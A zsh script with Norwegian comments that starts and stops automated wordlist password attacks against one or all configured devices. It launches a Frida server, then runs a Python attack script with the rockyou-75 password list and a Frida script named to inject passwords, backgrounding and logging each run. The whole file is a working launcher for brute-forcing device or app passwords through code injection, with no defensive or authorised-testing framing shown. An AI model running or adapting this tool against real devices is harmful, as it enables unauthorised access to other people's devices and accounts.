#!/usr/bin/env zsh

# Kilder inn felles.sh som inneholder device_info_map og andre funksjoner/variabler
source ./../ressurser/felles.sh

# Lag status-mappen hvis den ikke finnes
mkdir -p ./status/

# Sjekk om 'gjenoppta' parameteren er gitt
gjenoppta_flagg=""
if [[ "$3" == "gjenoppta" || "$3" == "-g" ]]; then
    gjenoppta_flagg="--gjenoppta"
fi

# Funksjon for å sjekke om et angrep allerede kjører for enheten
function sjekk_om_prosess_kjører {
    local device_name=$1

    # Sjekk om det finnes en aktiv Python-prosess for enheten
    if ps aux | grep -i "python" | grep -i "$device_name" > /dev/null; then
        echo "Et ordliste-angrep kjører allerede for enhet: $device_name. Hopper over."
        return 0  # Returner 0 for å indikere at prosessen kjører
    else
        return 1  # Returner 1 hvis ingen prosess kjører
    fi
}

# Funksjon for å kjøre ordliste-angrep og redirigere output til loggfiler
function kjør_for_enhet_med_logging {
    local device_name=$1
    local device_id=$2

    # Hvis prosessen allerede kjører for enheten, hopp over
    if sjekk_om_prosess_kjører "$device_name"; then
        return
    fi

    # Lag en ISO 8601-basert tidsstempel ned til sekund og erstatt koloner (:) med bindestreker (-)
    local timestamp=$(date +"%Y-%m-%dT%H-%M-%S")  # erstatter : med -

    # Lag mappen for enheten hvis den ikke finnes
    mkdir -p "./status/$device_name"
    
    # Sett opp loggfilnavn basert på tidsstempel, enhetsnavn og enhets-ID
    local log_fil="./status/$device_name/${timestamp}-${device_name}-${device_id}.log"
    
    echo "Kjører ordliste-angrep for enhet: $device_name (ID: $device_id). Logg lagres i: $log_fil" > "$log_fil" 2>&1 &

    # Kjør python-skriptet og rediriger både stdout og stderr til loggfilen, legg til --gjenoppta hvis gitt
    python3 ordliste-angrep.py -p rockyou-75.txt -s injiser-passord.js -d "$device_name" $gjenoppta_flagg > "$log_fil" 2>&1 &
}

# Funksjon for å stoppe alle Python-prosesser som kjører for enheten
function stopp_for_enhet {
    local device_name=$1

    # Finn og drep alle Python-prosesser relatert til enheten
    local pids=$(ps aux | grep -i "python" | grep -i "ordliste-angrep.py" | grep -i "$device_name" | awk '{print $2}')
    
    if [[ -n "$pids" ]]; then
        echo "Stopper prosesser for enhet: $device_name"
        kill $pids
        if [[ $? -eq 0 ]]; then
            echo "Prosesser for enhet $device_name stoppet."
        else
            echo "Feil: Klarte ikke å stoppe prosesser for enhet $device_name."
        fi
    else
        echo "Ingen kjørende prosesser funnet for enhet: $device_name."
    fi
}

# Funksjon for å kjøre angrep eller stoppe for en eller flere enheter
function behandle_enheter {
    local action=$1
    local enhet=$2

    # Hvis 'ALLE' er valgt, kjør for alle enheter i device_info_map
    if [[ "$enhet" == "ALLE" ]]; then
        for device_name in ${(k)device_info_map}; do
            local device_id=$(echo "${device_info_map[$device_name]}" | cut -d':' -f1)  # Henter enhets-ID fra device_info_map
            
            if [[ "$action" == "start" ]]; then
                kjør_for_enhet_med_logging "$device_name" "$device_id"
            elif [[ "$action" == "stopp" ]]; then
                stopp_for_enhet "$device_name"
            fi
        done
    else
        # Hvis spesifikk enhet er valgt, kjør kun for den
        local device_id=$(echo "${device_info_map[$enhet]}" | cut -d':' -f1)  # Henter enhets-ID fra device_info_map
        
        if [[ -n "$device_id" ]]; then
            if [[ "$action" == "start" ]]; then
                kjør_for_enhet_med_logging "$enhet" "$device_id"
            elif [[ "$action" == "stopp" ]]; then
                stopp_for_enhet "$enhet"
            fi
        else
            echo "Ukjent enhet: $enhet"
        fi
    fi
}

# Start eller stopp basert på første kommandolinjeparameter
if [[ "$1" == "start" ]]; then
    echo "Starter Frida-server..."
    ./styr-frida-server.sh start "$2"

    # Behandle enheten(e) for start
    behandle_enheter "start" "$2"

elif [[ "$1" == "stopp" ]]; then
    echo "Stopper ordliste-angrep..."

    # Behandle enheten(e) for stopp
    behandle_enheter "stopp" "$2"

else
    echo "Ugyldig parameter. Bruk 'start' for å starte angrep eller 'stopp' for å stoppe prosesser."
fi
